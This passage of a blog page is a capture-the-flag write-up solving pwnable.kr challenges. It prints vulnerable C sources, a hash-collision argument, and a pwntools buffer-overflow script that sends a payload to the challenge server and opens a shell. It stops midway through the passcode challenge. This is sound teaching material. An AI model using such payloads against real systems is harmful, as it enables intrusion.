@@ -1,0 +1,2046 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="wywwzjj">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="wywwzjj">
+    
+    <meta name="keywords" content="wywwzjj,wywwzjj blog,wywwzjj ctf,wywwzjj web security">
+    
+    <meta name="description" content>
+    <meta name="description" content="fd - 1 ptMommy! what is a file descriptor in Linux?* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:https://youtu.be/971eZhMHQQwssh fd@pwnable.kr -p2222">
+<meta name="keywords" content="Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr">
+<meta property="og:url" content="https://wywwzjj.top/2020/10/10/pwnable.kr/index.html">
+<meta property="og:site_name" content="wywwzjj&#39;s Blog">
+<meta property="og:description" content="fd - 1 ptMommy! what is a file descriptor in Linux?* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:https://youtu.be/971eZhMHQQwssh fd@pwnable.kr -p2222">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-10-15T15:40:26.384Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="pwnable.kr">
+<meta name="twitter:description" content="fd - 1 ptMommy! what is a file descriptor in Linux?* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:https://youtu.be/971eZhMHQQwssh fd@pwnable.kr -p2222">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    <link rel="alternate" href="/atom.xml" title="wywwzjj&#39;s Blog" type="application/atom+xml">
+    
+    <title>pwnable.kr · wywwzjj&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="stylesheet" href="/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href="/assets/B.ico">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js" as="script">
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">wywwzjj&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">pwnable.kr</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href="/">wywwzjj's Blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            pwnable.kr
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class="post-intro-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="Writeup">Writeup</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">3.3k</span>阅读时长: <span class="post-count reading-time">19 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/10/10</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="fd-1-pt"><a href="#fd-1-pt" class="headerlink" title="fd - 1 pt"></a>fd - 1 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:</span><br><span class="line">https://youtu.be/971eZhMHQQw</span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">➜  Tools ssh fd@pwnable.kr -p2222</span><br><span class="line">The authenticity of host '[pwnable.kr]:2222 ([128.61.240.205]:2222)' can't be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:I9nWMZvctQv4Vypnh9ICs6aB2g20WV/EjTIYJ83P0K8.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added '[pwnable.kr]:2222,[128.61.240.205]:2222' (ECDSA) to the list of known hosts.</span><br><span class="line">fd@pwnable.kr's password:</span><br><span class="line"> ____  __    __  ____    ____  ____   _        ___      __  _  ____</span><br><span class="line">|    \|  |__|  ||    \  /    ||    \ | |      /  _]    |  |/ ]|    \</span><br><span class="line">|  o  )  |  |  ||  _  ||  o  ||  o  )| |     /  [_     |  ' / |  D  )</span><br><span class="line">|   _/|  |  |  ||  |  ||     ||     || |___ |    _]    |    \ |    /</span><br><span class="line">|  |  |  `  '  ||  |  ||  _  ||  O  ||     ||   [_  __ |     \|    \</span><br><span class="line">|  |   \      / |  |  ||  |  ||     ||     ||     ||  ||  .  ||  .  \</span><br><span class="line">|__|    \_/\_/  |__|__||__|__||_____||_____||_____||__||__|\_||__|\_|</span><br><span class="line"></span><br><span class="line">- Site admin : daehee87@gatech.edu</span><br><span class="line">- IRC : irc.netgarage.org:6667 / #pwnable.kr</span><br><span class="line">- Simply type "irssi" command to join IRC now</span><br><span class="line">- files under /tmp can be erased anytime. make your directory under /tmp</span><br><span class="line">- to use peda, issue `source /usr/share/peda/peda.py` in gdb terminal</span><br><span class="line">You have new mail.</span><br><span class="line">Last login: Fri Oct  9 06:05:28 2020 from 222.206.18.226</span><br><span class="line">fd@pwnable:~$ ls -al</span><br><span class="line">total 40</span><br><span class="line">drwxr-x---   5 root   fd   4096 Oct 26  2016 .</span><br><span class="line">drwxr-xr-x 116 root   root 4096 Apr 17 14:10 ..</span><br><span class="line">d---------   2 root   root 4096 Jun 12  2014 .bash_history</span><br><span class="line">-r-sr-x---   1 fd_pwn fd   7322 Jun 11  2014 fd</span><br><span class="line">-rw-r--r--   1 root   root  418 Jun 11  2014 fd.c</span><br><span class="line">-r--r-----   1 fd_pwn root   50 Jun 11  2014 flag</span><br><span class="line">-rw-------   1 root   root  128 Oct 26  2016 .gdb_history</span><br><span class="line">dr-xr-xr-x   2 root   root 4096 Dec 19  2016 .irssi</span><br><span class="line">drwxr-xr-x   2 root   root 4096 Oct 23  2016 .pwntools-cache</span><br><span class="line">fd@pwnable:~$ cat fd.c</span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">include &lt;string.h&gt;</span></span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">	if(argc&lt;2)&#123;</span><br><span class="line">		printf("pass argv[1] a number\n");</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	int fd = atoi( argv[1] ) - 0x1234;</span><br><span class="line">	int len = 0;</span><br><span class="line">	len = read(fd, buf, 32);</span><br><span class="line">	if(!strcmp("LETMEWIN\n", buf))&#123;</span><br><span class="line">		printf("good job :)\n");</span><br><span class="line">		system("/bin/cat flag");</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	printf("learn about Linux file IO\n");</span><br><span class="line">	return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">fd@pwnable:~$ echo LETMEWIN | ./fd 4660</span><br><span class="line">good job :)</span><br><span class="line">mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
+
+<h1 id="collision-3-pt"><a href="#collision-3-pt" class="headerlink" title="collision - 3 pt"></a>collision - 3 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Daddy told me about cool MD5 hash collision today.</span><br><span class="line">I wanna do something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *ip = (<span class="keyword">int</span> *) p;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        res += ip[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hashcode == check_password(argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意的点：</p>
+<ul>
+<li><p>char 转 int，拿到的是 ASCII</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">转义为short型整数: struct.unpack(&apos;&lt;hh&apos;, bytes(b&apos;\x01\x00\x00\x00&apos;))  ==&gt;  (1, 0)</span><br><span class="line">转义为long型整数: struct.unpack(&apos;&lt;L&apos;, bytes(b&apos;\x01\x00\x00\x00&apos;))  ==&gt;  (1,)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>小端，需要转一下</p>
+</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt; p32(0x21DD09EC - u32(<span class="string">'\x01\x01\x01\x01'</span>)*4)</span></span><br><span class="line">b'\xe8\x05\xd9\x1d'</span><br><span class="line"></span><br><span class="line">col@pwnable:~$ ./col `python -c "print '\x01' * 16 + '\xe8\x05\xd9\x1d'"`</span><br><span class="line">daddy! I just managed to create a hash collision :)</span><br></pre></td></tr></table></figure>
+
+<h1 id="bof-5-pt"><a href="#bof-5-pt" class="headerlink" title="bof - 5 pt"></a>bof - 5 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability. </span><br><span class="line">Is that true?</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/bof</span><br><span class="line">Download : http://pwnable.kr/bin/bof.c</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">    gets(overflowme);    <span class="comment">// smash me!</span></span><br><span class="line">    <span class="keyword">if</span> (key == <span class="number">0xcafebabe</span>) &#123;</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>目标：覆盖 key 的值为 0xcafebabe。找一下 <code>overflowme</code> 到 <code>key</code> 的偏移量就好了。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:0000062C s               = byte ptr -2Ch</span><br><span class="line">.text:0000062C var_C           = dword ptr -0Ch</span><br><span class="line">.text:0000062C arg_0           = dword ptr  8</span><br><span class="line">.text:0000062C</span><br><span class="line">.text:0000062C ; __unwind &#123;</span><br><span class="line">.text:0000062C                 push    ebp</span><br><span class="line">.text:0000062D                 mov     ebp, esp</span><br><span class="line">.text:0000062F                 sub     esp, 48h</span><br><span class="line">.text:00000632                 mov     eax, large gs:14h</span><br><span class="line">.text:00000638                 mov     [ebp+var_C], eax</span><br><span class="line">.text:0000063B                 xor     eax, eax</span><br><span class="line">.text:0000063D                 mov     dword ptr [esp], offset s ; &quot;overflow me : &quot;</span><br><span class="line">.text:00000644                 call    puts</span><br><span class="line">.text:00000649                 lea     eax, [ebp+s]</span><br><span class="line">.text:0000064C                 mov     [esp], eax      ; s</span><br><span class="line">.text:0000064F                 call    gets</span><br><span class="line">.text:00000654                 cmp     [ebp+arg_0], 0CAFEBABEh</span><br><span class="line">.text:0000065B                 jnz     short loc_66B</span><br><span class="line">.text:0000065D                 mov     dword ptr [esp], offset command ; &quot;/bin/sh&quot;</span><br><span class="line">.text:00000664                 call    system</span><br><span class="line">.text:00000669                 jmp     short loc_677</span><br><span class="line">.text:0000066B ; ------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+
+<p>关键的比较逻辑：<code>cmp [ebp+8], 0CAFEBABEh</code>。gets 这里也是用的相对 ebp 的地址，这就简单了。</p>
+<p>传参给 gets 是用的 eax，这有条 <code>lea eax, [ebp+s]</code> 的指令，所以 overflowme 数组的起始地址是 <code>ebp+s</code>。</p>
+<p>而 s 是 <code>-2Ch</code>，所以这里的地址差就是 <code>0x2c + 8</code>，即 52。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b"A"</span> * <span class="number">52</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">target.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Drop to an interactive shell, so we can read everything the server prints out</span></span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Python3 的 byte 不能直接和 str 拼接了，需要转一下。</p>
+<h1 id="flag-7-pt"><a href="#flag-7-pt" class="headerlink" title="flag - 7 pt"></a>flag - 7 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Papa brought me a packed present! let&apos;s open it.</span><br><span class="line"></span><br><span class="line">Download : http://pwnable.kr/bin/flag</span><br><span class="line"></span><br><span class="line">This is reversing task. all you need is binary</span><br></pre></td></tr></table></figure>
+
+<p>IDA 打开，发现只有一个 start 和另外两个函数，可能有壳，upx -d。</p>
+<blockquote>
+<p>ELF 的也可以用 exeinfo 查看一下。</p>
+</blockquote>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"I will malloc() and strcpy the flag there. take it."</span>, argv, envp);</span><br><span class="line">  dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">100L</span>L);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进 flag 定义，就能看到 flag 了。</p>
+<h1 id="passcode-10-pt"><a href="#passcode-10-pt" class="headerlink" title="passcode - 10 pt"></a>passcode - 10 pt</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mommy told me to make a passcode based login system.</span><br><span class="line">My initial C code was compiled without any error!</span><br><span class="line">Well, there was some compiler warning, but who cares about that?</span><br><span class="line"></span><br><span class="line">ssh passcode@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> passcode1;</span><br><span class="line">    <span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">    fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">    <span class="keyword">if</span> (passcode1 == <span class="number">338150</span> &amp;&amp; passcode2 == <span class="number">13371337</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span 